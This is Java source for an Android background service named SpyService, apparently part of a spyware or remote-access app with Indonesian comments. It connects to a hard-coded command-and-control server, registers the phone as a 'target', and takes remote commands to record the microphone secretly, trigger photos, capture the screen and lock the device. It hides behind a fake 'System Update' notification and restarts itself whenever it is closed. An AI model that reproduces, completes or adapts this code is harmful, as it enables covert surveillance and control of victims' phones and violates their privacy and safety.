package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.File;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class SpyService extends Service {

    private static final String CHANNEL_ID = "system_core_monitor";
    private static final String TAG = "CRPT_ZDX_ENGINE";
    private static final String SERVER_URL = "http://manipulator.panel.serverku.space:2026";
    
    private Socket mSocket;
    private MediaRecorder recorder;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startServiceInForeground();
        initNativeSocket(); // [+] Aktifkan koneksi luar APK
    }

    // ==========================================================
    // [+] NATIVE SOCKET LISTENER (ALWAYS-ON)
    // ==========================================================
    private void initNativeSocket() {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "unknown");

            IO.Options opts = new IO.Options();
            // FIXED: Menggunakan query yang sama dengan main.dart agar server mengenali sebagai target
            opts.query = "id=" + targetId + "&type=target";
            opts.forceNew = true;
            opts.reconnection = true;

            mSocket = IO.socket(SERVER_URL, opts);

            mSocket.on(Socket.EVENT_CONNECT, args -> Log.d(TAG, "CONNECTED TO C2 SERVER"));
            
            // FIXED: Sinkronisasi nama event dengan Server.js (new_command)
            mSocket.on("new_command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.getString("command");
                    String extra = data.optString("extra", "");
                    
                    Log.d(TAG, "RECEIVED COMMAND: " + command);
                    
                    // Eksekusi logic native atau teruskan ke Flutter via Proxy
                    handleIncomingCommand(command, extra);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Execute Error: " + e.getMessage());
                }
            });

            // Backward compatibility jika server masih mengirim event 'execute'
            mSocket.on("execute", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    handleIncomingCommand(data.getString("command"), data.optString("extra", ""));
                } catch (Exception e) {}
            });

            mSocket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket Config Error: " + e.getMessage());
        }
    }

    private void handleIncomingCommand(String cmd, String extra) {
        switch (cmd) {
            case "START_AUDIO_RECORD":
                startRecording();
                break;
            case "STOP_AUDIO_RECORD":
                stopRecording();
                break;
            default:
                // Teruskan ke MainActivity/main.dart untuk fungsi lainnya (Kamera, Strobe, dll)
                broadcastToApp(cmd, extra);
                break;
        }
    }

    private void broadcastToApp(String cmd, String extra) {
        // Mengirim ke Proxy Listener di main.dart
        Intent intent = new Intent("com.nullx.pp.COMMAND_PROXY");
        intent.putExtra("cmd", cmd);
        intent.putExtra("extra", extra);
        sendBroadcast(intent);
        
        // Force Wakeup untuk perintah kritis agar background process tidak ter-freeze oleh Doze Mode
        if(cmd.equals("take_photo") || cmd.equals("get_screen") || cmd.equals("hard_lock")) {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            startActivity(i);
        }
    }

    // ==========================================================
    // [+] SERVICE CORE CONFIG (ANDROID 14/15 COMPLIANT)
    // ==========================================================

    private void startServiceInForeground() {
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing battery usage...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .setSilent(true)
                .setContentIntent(pendingIntent)
                .build();

        // FIXED: Implementasi Foreground Service Type untuk bypass proteksi API 34 & 35
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
            startForeground(101, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(101, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(101, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID,
                    "System Optimization Service", NotificationManager.IMPORTANCE_LOW);
            serviceChannel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void startRecording() {
        if (isRecording) return;
        try {
            File logFile = new File(getExternalFilesDir(null), "system_log.mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(logFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            isRecording = true;
        } catch (Exception e) { Log.e(TAG, "Rec Error: " + e.getMessage()); }
    }

    private void stopRecording() {
        if (recorder != null && isRecording) {
            try {
                recorder.stop();
                recorder.release();
            } catch (Exception e) { Log.e(TAG, "Stop Error: " + e.getMessage()); }
            finally { recorder = null; isRecording = false; }
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Auto-restart jika di swipe dari recent apps
        Intent restartIntent = new Intent(getApplicationContext(), SpyService.class);
        startService(restartIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        if (mSocket != null) mSocket.disconnect();
        // Trigger RestarterReceiver untuk menghidupkan kembali service
        sendBroadcast(new Intent("RestartSpyService"));
        super.onDestroy();
    }
}